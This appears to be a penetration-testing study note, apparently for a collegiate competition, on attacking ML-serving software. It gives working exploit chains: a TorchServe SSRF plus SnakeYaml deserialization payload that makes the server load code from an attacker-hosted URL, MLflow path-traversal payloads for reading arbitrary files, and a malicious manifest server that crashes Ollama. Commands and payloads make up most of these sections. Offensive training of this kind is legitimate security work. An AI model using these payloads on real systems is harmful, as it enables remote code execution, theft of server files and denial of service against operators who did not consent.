# 02 — System-Layer Attacks & CVEs

**Jump to:** [Insecure Data Storage](#insecure-data-storage) · [Model Deployment Tampering](#model-deployment-tampering) · [CVE-2023-43654 / ShellTorch (TorchServe RCE)](#shelltorch-torchserve-rce) · [CVE-2023-6909 / CVE-2024-1594 (MLflow LFI)](#mlflow-lfi) · [CVE-2025-1975 (Ollama DoS)](#ollama-dos)

The system layer is everything the ML stack runs on: serving frameworks, storage, deployment pipelines. These findings are almost always **conventional infra vulns in specific ML-stack software** — check versions against known CVEs first before trying anything fancy.

## Insecure Data Storage

Standard excessive-data-handling + broken-storage findings, just flavored by the AI deployment:

```bash
gobuster dir -u http://<target>/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x .db,.txt,.html
```

If you find an exposed DB dump (`storage.db`), it often contains full LLM interaction logs — prompts, responses, IP addresses, and anything sensitive a user typed into the chatbot (medical info, payment details asked for inappropriately by a poorly-scoped bot). Flag any instance of a chatbot requesting PCI-scope data (card numbers) or health data directly in chat — that's a design flaw worth its own finding regardless of whether storage is also broken.

**Mitigations:** data minimization, encryption at rest, access control on storage endpoints, retention policies.

## Model Deployment Tampering

If an attacker gets write access to model files or training data (misconfigured FTP/S3, broken auth on an upload endpoint), they can directly alter model weights or poison training data to introduce backdoors. Low priority to attempt yourself in CPTC, but worth checking for **exposed write-capable endpoints** to model/training artifacts as a finding even without exploiting further.

## ShellTorch (TorchServe RCE)

Real-world exploit chain, three chained CVEs:
1. **Misconfigured management API** exposed on all interfaces (docs claim localhost-only; quickstart guide didn't enforce it) — no auth required.
2. **SSRF** (`CVE-2023-43654`) in the `/workflows` endpoint — no URL validation, lets you make the server fetch attacker-hosted files.
3. **Deserialization RCE** (`CVE-2022-1471`) in a vulnerable `SnakeYaml` version — malicious YAML triggers remote class loading.

```bash
# confirm management API access
curl http://<target>:8081/

# confirm SSRF — listen, then trigger
nc -lnvp 8000
curl -X POST "http://<target>:8081/workflows?url=http://<your-ip>:8000/ssrf"

# build malicious workflow archive
pip3 install torch-workflow-archiver
torch-workflow-archiver --workflow-name pwn --spec-file spec.yaml --handler handler.py
# spec.yaml: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<your-ip>:8000/"]]]]

# host payload + trigger
python3 -m http.server 8000
curl -X POST "http://<target>:8081/workflows?url=http://<your-ip>:8000/pwn.war"
```
Java payload must implement `ScriptEngineFactory` with your RCE in the constructor. Full walkthrough: [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload).

## MLflow LFI

**CVE-2023-6909** (MLflow 2.7.1) — path traversal via unvalidated URL in `artifact_location`:
```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn", "artifact_location": "http:///?/../../../../../../../../../"}' \
  'http://<target>:8080/ajax-api/2.0/mlflow/experiments/create'
```
Chain: create experiment with traversal payload → create run → register model → link model version with `"source": "file:///"` → read arbitrary files via `/model-versions/get-artifact?path=<file>&name=<model>&version=1`.

**CVE-2024-1594** (MLflow 2.9.2) — the 2023 fix only checked the query string; the same payload works via a URL **fragment** (`#`) instead:
```bash
-d '{"name": "pwn2", "artifact_location": "http:///#../../../../../../../../../etc/"}'
```

## Ollama DoS

**CVE-2025-1975** (ollama 0.5.11) — malformed model manifest crashes the server (array bounds check missing):
```python
# malicious manifest server
from flask import Flask
app = Flask(__name__)

@app.route("/v2/dos/model/manifests/latest")
def exploit():
    return {"layers": [{}]}

app.run(host='127.0.0.1', port=5000)
```
```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"model": "http://localhost:5000/dos/model", "insecure": true}' \
  http://localhost:11434/api/pull
```

**Takeaway for recon:** always fingerprint the ML serving stack in scope (TorchServe, MLflow, Ollama, Triton, BentoML, etc.) and check versions against CVE databases before going hunting for novel bugs — these frameworks are young and under-scrutinized compared to mainstream web frameworks.
